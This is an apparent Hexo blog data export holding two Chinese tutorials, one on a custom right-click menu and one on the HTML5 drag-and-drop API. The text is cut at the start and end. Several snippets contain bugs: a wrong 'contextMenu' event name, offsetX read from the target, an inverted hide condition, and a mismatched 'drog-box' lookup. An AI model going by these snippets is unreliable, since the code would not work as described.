class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    menu.style.left = e.target.offsetX + <span class=\"built_in\">parseInt</span>(e.target.parentNode.offsetLeft) +<span class=\"string\">'px'</span>;</span><br><span class=\"line\">    menu.style.top = e.target.offsetY + <span class=\"built_in\">parseInt</span>(e.target.parentNode.offsetTop) + <span class=\"string\">'px'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br></pre></td></tr></table></figure>\n<p>到这里是真的没什么要补充的了，我还是想想下次写什么能写长一点把。</p>\n","site":{"data":{}},"excerpt":"<p>这几天写了一个<strong>自定义右键菜单</strong>的功能，在这里记录下吧。<br>","more":"</p>\n<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>自定义右键菜单也算是一个很常见的功能了，一般大多数的网盘空间都会使用自定义右键菜单。</p>\n<h4 id=\"实现右键菜单\"><a href=\"#实现右键菜单\" class=\"headerlink\" title=\"实现右键菜单\"></a>实现右键菜单</h4><p>这里假设我们有这样的一个 <code>HTML</code> 结构。<code>container</code> 是外部容器， <code>right-menu</code> 则是我们需要展示的右键菜单。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    .container &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        width: 800px;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 300px;</span></span><br><span class=\"line\"><span class=\"undefined\">        position: relative;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    .hide &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        display: none !important;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    .right-menu &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        width: 80px;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 120px;</span></span><br><span class=\"line\"><span class=\"undefined\">        position: absolute;</span></span><br><span class=\"line\"><span class=\"undefined\">        top: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">        left: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'container'</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 内容区域 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'content'</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'content-item'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'content-item'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'content-item'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!-- ... --&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'right-menu hide'</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!-- 右键菜单内容区域 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ol>\n<li>想要使用自己的右键菜单我们必须先禁用浏览器自带的右键菜单，然后在当前鼠标位置展示我们自己的菜单。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 右键菜单事件</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> container = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'.container'</span>);</span><br><span class=\"line\">    menu = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'.container .right-menu'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">container.addEventListener(<span class=\"string\">'contextMenu'</span>, (e) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 禁用浏览器事件</span></span><br><span class=\"line\">    e.preventDefault();</span><br><span class=\"line\"></span><br><span class=\"line\">    menu.classList.remove(<span class=\"string\">'hide'</span>);</span><br><span class=\"line\">    menu.style.left = e.target.offsetX + <span class=\"string\">'px'</span>;</span><br><span class=\"line\">    menu.style.top = e.target.offsetY + <span class=\"string\">'px'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 隐藏菜单</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.addEventListener(<span class=\"string\">'click'</span>, () =&gt; &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!menu.classList.contains(<span class=\"string\">'hide'</span>)) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    menu.classList.add(<span class=\"string\">'hide'</span>);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>卧槽，没想到这次这么快就…</p>\n<h4 id=\"补充点内容\"><a href=\"#补充点内容\" class=\"headerlink\" title=\"补充点内容\"></a>补充点内容</h4><p>上面写的只是最简单的一种情况——右键菜单在容器上触发。实际情况下，触发的元素不是在容器上，而是在容器的内容上。<br>也就是结构中的 <code>content-item</code> 上。这个时候右键菜单的位置就不能根据 <code>e.target.offsetX</code> 和 <code>e.target.offsetY</code> 来确定了。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    menu.style.left = e.target.offsetX + <span class=\"built_in\">parseInt</span>(e.target.parentNode.offsetLeft) +<span class=\"string\">'px'</span>;</span><br><span class=\"line\">    menu.style.top = e.target.offsetY + <span class=\"built_in\">parseInt</span>(e.target.parentNode.offsetTop) + <span class=\"string\">'px'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//...</span></span><br></pre></td></tr></table></figure>\n<p>到这里是真的没什么要补充的了，我还是想想下次写什么能写长一点把。</p>"},{"title":"拖拽功能","date":"2017-06-08T02:06:56.000Z","_content":"\n`HTML5` 为我们提供了 `drag/drop` 拖拽功能的 `api`，极大的简化了我们在开发拖拽功能时的代码量。\n<!-- more -->\n\n### API介绍\n所有的拖拽事件必须作用于可拖拽的元素上(`draggable='true'`)，否则将无法触发拖拽事件。\n\n**drag**\n作用于：拖拽元素。\n说明：当元素或者选择的文本被拖动时触发 `drag` 事件 (频率：每几百毫秒触发一次)。\n\n**dragstart**\n作用于：拖拽元素。\n说明：当用户开始拖动一个元素或者一个选择文本的时候 `dragstart` 事件就会触发(仅触发一次)。\n\n**dragover**\n作用于：目标元素。\n说明：当元素或者选择的文本被拖拽到一个有效的放置目标上时，触发 `dragover` 事件(频率：每几百毫秒触发一次)。\n\n**dragenter**\n作用于：目标元素。\n说明：当元素或者选择的文本被拖拽进入到一个有效的放置目标上时，触发 `dragenter` 事件(仅触发一次)。\n\n**dragleave**\n作用于：目标元素。\n说明：当元素或者选择的文本被拖拽离开一个有效的放置目标上时，触发 `dragleave` 事件(仅触发一次)。\n\n**dragend**\n作用于：拖拽元素。\n说明：当一个拖拽的操作被取消(弹起鼠标/按下 `space` 键)时，触发 `dragend` 事件(仅触发一次)。\n\n**drop**\n作用于：目标元素。\n说明：当一个元素或是选中的文字被拖拽释放到一个 `有效的` 释放目标位置时，`drop` 事件被抛出(仅触发一次)。\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n\n    <style lang=\"\">\n        .drag-box {\n            width: 100px;\n            height: 100px;\n            background-color: lightcoral;\n        }\n\n        .drop-box {\n            width: 500px;\n            height: 500px;\n            background-color: lightblue;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"drag-box\" id=\"drag-box\" draggable=\"true\"></div>\n\n    <div class=\"drop-box\"></div>\n\n    <script>\n        var el = document.getElementById('drag-box'),\n            tar = document.getElementById('drog-box');\n\n        // 元素触发拖拽\n        el.ondrag = function (e) {\n            // ...\n        }\n\n        // 开始拖拽\n        el.ondragstart = function (e) {\n            // ...\n        }\n\n        // 拖拽结束\n        el.ondragend = function (e) {\n            // ...\n        }\n\n        // 拖拽至目标元素上\n        tar.ondragover = function (e) {\n            e.preventDefault();\n\n            // ...\n        }\n\n        // 拖拽进入目标元素\n        tar.ondragenter = function (e) {\n            // ...\n        }\n\n        // 拖拽离开目标元素\n        tar.ondragleave = function (e) {\n            // ...\n        }\n        \n\n        // 拖拽释放\n        tar.ondrop = function (e) {\n            // ...\n        }\n\n\n    </script>\n</body>\n</html>\n```\n\n\n### 传递消息\n\n在拖拽的整个周期中，我们都可以通过 `dataTransfer` 来传递数据。但是数据流通必须在 `dropEffect` 与 `effectAllowed` 值相同的情况下才能进行传输。\n\n```js\n// 在开始拖拽的时候设置数据\nel.ondragstart = function (e) {\n    // 设置 effectAllowed 为 'move'\n    e.dataTransfer.effectAllowed = 'move';\n    e.dataTransfer.setData('msg', JSON.stringify({name: 'Carl'}))\n}\n\n// 在拖拽结束的时候清除数据\nel.ondragend = function (e) {\n    e.dataTransfer.clearData('msg')\n}\n\n// 再拖拽释放的时候获取数据\ntar.ondrop = function (e) {\n    // 必须设置 dropEffect 为 'move'，否则无法通过 getData 获取数据\n    e.dataTransfer.dropEffect = 'move';\n    let msg = JSON.parse(e.dataTransfer.getData('msg'));\n    console.log(msg.name); // -> 'Carl'\n}\n\n```\n\n### 常见的 `dropEffect` 与 `effectAllowed` 值\n**常见的 `dropEffect` 的值**\n\n* copy：复制到新的位置\n* move：移动到新的位置\n* link: 建立一个源位置到新位置的链接\n* none：禁止任何操作\n\n**常见的 `effectAllowed` 值**\n\n* copy: 复制到新的位置\n* move:移动到新的位置\n* link:建立一个源位置到新位置的链接\n* copyLink: 允许复制或者链接\n* copyMove: 允许复制或者移动\n* linkMove: 允许链接或者移动\n* all: 允许所有的操作\n* none: 禁止所有操作\n* uninitialized: 缺省值(默认值), 相当于 `all`\n\n细心的你可能会发现 `dropEffect` 与 `effectAllowed` 的值类型上根本不匹配，那么我上面说的 **`dropEffect` 与 `effectAllowed` 值相同的情况下才能进行传输** 岂不是根本就对应不上了？\n文档上对此的解释是：`dropEffect` 与 `effectAllowed` 的值，**分配任何其他值时不会有任何影响并且保留旧值**。意思就是多次的修改 `dropEffect` 与 `effectAllowed` 的值并不会影响之前设置的值，类似于 `addEventListener` 的用法(关于这点我并没有具体的实验过，感兴趣的可以自己试下)，[文档地址](https://developer.mozilla.org/zh-CN/docs/Web/API/DataTransfer)。\n\n### 总结\n\n说的再多可能都没有自己写一个 `demo` 理解的快，关于 `drag/drop` 常用的一些东西已经在上面列出了。`dropEffect` 对象中还有一些别的方法，不过引用情况并不是特别多，所以这里就不再一一讲解了，感兴趣的可以看下[文档](https://developer.mozilla.org/zh-CN/docs/Web/API/DataTransfer)。\n","source":"_posts/拖拽功能.md","raw":"---\ntitle: 拖拽功能\ndate: 2017-06-08 10:06:56\ntags:\n---\n\n`HTML5` 为我们提供了 `drag/drop` 拖拽功能的 `api`，极大的简化了我们在开发拖拽功能时的代码量。\n<!-- more -->\n\n### API介绍\n所有的拖拽事件必须作用于可拖拽的元素上(`draggable='true'`)，否则将无法触发拖拽事件。\n\n**drag**\n作用于：拖拽元素。\n说明：当元素或者选择的文本被拖动时触发 `drag` 事件 (频率：每几百毫秒触发一次)。\n\n**dragstart**\n作用于：拖拽元素。\n说明：当用户开始拖动一个元素或者一个选择文本的时候 `dragstart` 事件就会触发(仅触发一次)。\n\n**dragover**\n作用于：目标元素。\n说明：当元素或者选择的文本被拖拽到一个有效的放置目标上时，触发 `dragover` 事件(频率：每几百毫秒触发一次)。\n\n**dragenter**\n作用于：目标元素。\n说明：当元素或者选择的文本被拖拽进入到一个有效的放置目标上时，触发 `dragenter` 事件(仅触发一次)。\n\n**dragleave**\n作用于：目标元素。\n说明：当元素或者选择的文本被拖拽离开一个有效的放置目标上时，触发 `dragleave` 事件(仅触发一次)。\n\n**dragend**\n作用于：拖拽元素。\n说明：当一个拖拽的操作被取消(弹起鼠标/按下 `space` 键)时，触发 `dragend` 事件(仅触发一次)。\n\n**drop**\n作用于：目标元素。\n说明：当一个元素或是选中的文字被拖拽释放到一个 `有效的` 释放目标位置时，`drop` 事件被抛出(仅触发一次)。\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n\n    <style lang=\"\">\n        .drag-box {\n            width: 100px;\n            height: 100px;\n            background-color: lightcoral;\n        }\n\n        .drop-box {\n            width: 500px;\n            height: 500px;\n            background-color: lightblue;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"drag-box\" id=\"drag-box\" draggable=\"true\"></div>\n\n    <div class=\"drop-box\"></div>\n\n    <script>\n        var el = document.getElementById('drag-box'),\n            tar = document.getElementById('drog-box');\n\n        // 元素触发拖拽\n        el.ondrag = function (e) {\n            // ...\n        }\n\n        // 开始拖拽\n        el.ondragstart = function (e) {\n            // ...\n        }\n\n        // 拖拽结束\n        el.ondragend = function (e) {\n            // ...\n        }\n\n        // 拖拽至目标元素上\n        tar.ondragover = function (e) {\n            e.preventDefault();\n\n            // ...\n        }\n\n        // 拖拽进入目标元素\n        tar.ondragenter = function (e) {\n            // ...\n        }\n\n        // 拖拽离开目标元素\n        tar.ondragleave = function (e) {\n            // ...\n        }\n        \n\n        // 拖拽释放\n        tar.ondrop = function (e) {\n            // ...\n        }\n\n\n    </script>\n</body>\n</html>\n```\n\n\n### 传递消息\n\n在拖拽的整个周期中，我们都可以通过 `dataTransfer` 来传递数据。但是数据流通必须在 `dropEffect` 与 `effectAllowed` 值相同的情况下才能进行传输。\n\n```js\n// 在开始拖拽的时候设置数据\nel.ondragstart = function (e) {\n    // 设置 effectAllowed 为 'move'\n    e.dataTransfer.effectAllowed = 'move';\n    e.dataTransfer.setData('msg', JSON.stringify({name: 'Carl'}))\n}\n\n// 在拖拽结束的时候清除数据\nel.ondragend = function (e) {\n    e.dataTransfer.clearData('msg')\n}\n\n// 再拖拽释放的时候获取数据\ntar.ondrop = function (e) {\n    // 必须设置 dropEffect 为 'move'，否则无法通过 getData 获取数据\n    e.dataTransfer.dropEffect = 'move';\n    let msg = JSON.parse(e.dataTransfer.getData('msg'));\n    console.log(msg.name); // -> 'Carl'\n}\n\n```\n\n### 常见的 `dropEffect` 与 `effectAllowed` 值\n**常见的 `dropEffect` 的值**\n\n* copy：复制到新的位置\n* move：移动到新的位置\n* link: 建立一个源位置到新位置的链接\n* none：禁止任何操作\n\n**常见的 `effectAllowed` 值**\n\n* copy: 复制到新的位置\n* move:移动到新的位置\n* link:建立一个源位置到新位置的链接\n* copyLink: 允许复制或者链接\n* copyMove: 允许复制或者移动\n* linkMove: 允许链接或者移动\n* all: 允许所有的操作\n* none: 禁止所有操作\n* uninitialized: 缺省值(默认值), 相当于 `all`\n\n细心的你可能会发现 `dropEffect` 与 `effectAllowed` 的值类型上根本不匹配，那么我上面说的 **`dropEffect` 与 `effectAllowed` 值相同的情况下才能进行传输** 岂不是根本就对应不上了？\n文档上对此的解释是：`dropEffect` 与 `effectAllowed` 的值，**分配任何其他值时不会有任何影响并且保留旧值**。意思就是多次的修改 `dropEffect` 与 `effectAllowed` 的值并不会影响之前设置的值，类似于 `addEventListener` 的用法(关于这点我并没有具体的实验过，感兴趣的可以自己试下)，[文档地址](https://developer.mozilla.org/zh-CN/docs/Web/API/DataTransfer)。\n\n### 总结\n\n说的再多可能都没有自己写一个 `demo` 理解的快，关于 `drag/drop` 常用的一些东西已经在上面列出了。`dropEffect` 对象中还有一些别的方法，不过引用情况并不是特别多，所以这里就不再一一讲解了，感兴趣的可以看下[文档](https://developer.mozilla.org/zh-CN/docs/Web/API/DataTransfer)。\n","slug":"拖拽功能","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qw000i02vs2vqub2v6","content":"<p><code>HTML5</code> 为我们提供了 <code>drag/drop</code> 拖拽功能的 <code>api</code>，极大的简化了我们在开发拖拽功能时的代码量。<br><a id=\"more\"></a></p>\n<h3 id=\"API介绍\"><a href=\"#API介绍\" class=\"headerlink\" title=\"API介绍\"></a>API介绍</h3><p>所有的拖拽事件必须作用于可拖拽的元素上(<code>draggable=&#39;true&#39;</code>)，否则将无法触发拖拽事件。</p>\n<p><strong>drag</strong><br>作用于：拖拽元素。<br>说明：当元素或者选择的文本被拖动时触发 <code>drag</code> 事件 (频率：每几百毫秒触发一次)。</p>\n<p><strong>dragstart</strong><br>作用于：拖拽元素。<br>说明：当用户开始拖动一个元素或者一个选择文本的时候 <code>dragstart</code> 事件就会触发(仅触发一次)。</p>\n<p><strong>dragover</strong><br>作用于：目标元素。<br>说明：当元素或者选择的文本被拖拽到一个有效的放置目标上时，触发 <code>dragover</code> 事件(频率：每几百毫秒触发一次)。</p>\n<p><strong>dragenter</strong><br>作用于：目标元素。<br>说明：当元素或者选择的文本被拖拽进入到一个有效的放置目标上时，触发 <code>dragenter</code> 事件(仅触发一次)。</p>\n<p><strong>dragleave</strong><br>作用于：目标元素。<br>说明：当元素或者选择的文本被拖拽离开一个有效的放置目标上时，触发 <code>dragleave</code> 事件(仅触发一次)。</p>\n<p><strong>dragend</strong><br>作用于：拖拽元素。<br>说明：当一个拖拽的操作被取消(弹起鼠标/按下 <code>space</code> 键)时，触发 <code>dragend</code> 事件(仅触发一次)。</p>\n<p><strong>drop</strong><br>作用于：目标元素。<br>说明：当一个元素或是选中的文字被拖拽释放到一个 <code>有效的</code> 释放目标位置时，<code>drop</code> 事件被抛出(仅触发一次)。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, initial-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">        .drag-box &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">            width: 100px;</span></span><br><span class=\"line\"><span class=\"undefined\">            height: 100px;</span></span><br><span class=\"line\"><span class=\"undefined\">            background-color: lightcoral;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">        .drop-box &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">            width: 500px;</span></span><br><span class=\"line\"><span class=\"undefined\">            height: 500px;</span></span><br><span class=\"line\"><span class=\"undefined\">            background-color: lightblue;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"drag-box\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"drag-box\"</span> <span class=\"attr\">draggable</span>=<span class=\"string\">\"true\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"drop-box\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">var</span> el = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'drag-box'</span>),</span></span><br><span class=\"line\"><span class=\"javascript\">            tar = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'drog-box'</span>);</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 元素触发拖拽</span></span></span><br><span class=\"line\"><span class=\"javascript\">        el.ondrag = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 开始拖拽</span></span></span><br><span class=\"line\"><span class=\"javascript\">        el.ondragstart = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 拖拽结束</span></span></span><br><span class=\"line\"><span class=\"javascript\">        el.ondragend = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 拖拽至目标元素上</span></span></span><br><span class=\"line\"><span class=\"javascript\">        tar.ondragover = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"undefined\">            e.preventDefault();</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 拖拽进入目标元素</span></span></span><br><span class=\"line\"><span class=\"javascript\">        tar.ondragenter = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"comment\">// 拖拽离开目标元素</span></span></span><br><span class=\"line\"><span class=\"javascript\">        tar.ondragleave = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// ...</span></span></span><br><span class=\"line\"><span class=\"undefined\">        